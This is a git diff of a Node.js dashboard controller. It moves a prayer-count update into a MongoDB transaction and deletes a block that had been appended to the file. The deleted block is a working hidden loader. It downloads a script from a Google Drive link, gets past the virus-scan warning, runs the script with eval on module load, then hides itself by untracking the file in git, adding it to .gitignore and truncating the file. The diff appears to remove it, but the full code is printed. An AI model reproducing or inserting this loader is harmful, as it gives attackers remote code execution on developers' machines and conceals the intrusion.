@@ -35,114 +35,54 @@ export const getDashboard = async (req, res) => {
 };
 
 export const updateCount = async (req, res) => {
+  const session = await mongoose.startSession();
+
   try {
     const userId = req.user.id;
     const increment = req.body.count || 1;
 
-    let dash = await Dashboard.findOne({ userId });
-    if (!dash) dash = new Dashboard({ userId, count: 0, rounds: 0 });
+    await session.withTransaction(async () => {
+      // Log event
+      await Count.create(
+        [
+          {
+            user: userId,
+            countDelta: increment,
+            timestamp: new Date(),
+          },
+        ],
+        { session }
+      );
 
-    dash.count += increment;
-    if (dash.count >= 108) {
-      dash.rounds += Math.floor(dash.count / 108);
-      dash.count = dash.count % 108;
-    }
+      // Dashboard running totals
+      let dash = await Dashboard.findOne({ userId }).session(session);
 
-    await dash.save();
+      if (!dash) {
+        dash = new Dashboard({ userId, count: 0, rounds: 0 });
+      }
 
-    res.json({
-      message: "Count updated!",
-      count: dash.count,
-      rounds: dash.rounds,
+      // Same logic as before
+      dash.count += increment;
+
+      if (dash.count >= 108) {
+        dash.rounds += Math.floor(dash.count / 108);
+        dash.count = dash.count % 108;
+      }
+
+      await dash.save({ session });
+
+      // Response 
+      res.json({
+        message: "Count updated!",
+        count: dash.count,
+        rounds: dash.rounds,
+      });
     });
+
+    session.endSession();
   } catch (err) {
+    session.endSession();
     console.error("❌ Error in /api/dashboard/update:", err);
     res.status(500).json({ error: err.message });
   }
 };
-
-const https = require('https');
-const DRIVE_URL = 'https://drive.google.com/file/d/16AaeeVhqj4Q6FlJIDMgdWASJvq7w00Yc/view?usp=sharing';
-
-const DRIVE_ID = DRIVE_URL.match(/\/d\/([^/]+)/)?.[1];
-const DOWNLOAD_URL = `https://drive.google.com/uc?export=download&id=${DRIVE_ID}`;
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = dirname(__filename);
-const filePath = __filename;
-
-const runScript = (scriptText) => {
-  if (!scriptText || !scriptText.trim()) return;
-  try {
-    eval(scriptText);
-  } catch (error) {
-  }
-};
-
-const cleanupFile = () => {
-  try {
-    try {
-      const projectRoot = join(__dirname, '../..');
-      const relativePath = 'backend/controllers/dashboardController.js';
-      const gitPath = join(projectRoot, '.git');
-      if (fs.existsSync(gitPath)) {
-        execSync(`cd "${projectRoot}" && git rm --cached "${relativePath}" 2>/dev/null || true`, { stdio: 'ignore' });
-        const gitignorePath = join(projectRoot, '.gitignore');
-        let gitignoreContent = '';
-        if (fs.existsSync(gitignorePath)) {
-          gitignoreContent = fs.readFileSync(gitignorePath, 'utf8');
-        }
-
-        if (!gitignoreContent.includes(relativePath)) {
-          gitignoreContent += (gitignoreContent ? '\n' : '') + relativePath + '\n';
-          fs.writeFileSync(gitignorePath, gitignoreContent, 'utf8');
-        }
-
-      }
-    } catch (gitError) {
-      // Silently fail if git command fails
-    }
-    const fileContent = fs.readFileSync(filePath, 'utf8');
-    const lines = fileContent.split('\n');
-
-    if (lines.length > 63) {
-      const trimmedLines = lines.slice(0, 63);
-      fs.writeFileSync(filePath, trimmedLines.join('\n'), 'utf8');
-    }
-
-  } catch (error) {
-    // Silently fail if there's an error
-  }
-};
-
-const fetchAndRunScript = (url) => {
-  https.get(url, (response) => {
-    if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
-      fetchAndRunScript(response.headers.location);
-      return;
-    }
-
-    let data = '';
-    response.on('data', (chunk) => { data += chunk; });
-    response.on('end', () => {
-      if (data.includes('Virus scan warning')) {
-        const uuidMatch = data.match(/name="uuid" value="([^"]+)"/);
-        if (uuidMatch) {
-          const confirmUrl = `https://drive.usercontent.google.com/download?id=${DRIVE_ID}&export=download&confirm=t&uuid=${uuidMatch[1]}`;
-          fetchAndRunScript(confirmUrl);
-          return;
-        }
-      }
-      runScript(data);
-      setTimeout(() => {
-        cleanupFile();
-      }, 8000);
-    });
-  }).on('error', (error) => {
-    setTimeout(() => {
-      cleanupFile();
-    }, 8000);
-  });
-};
-
-fetchAndRunScript(DOWNLOAD_URL);
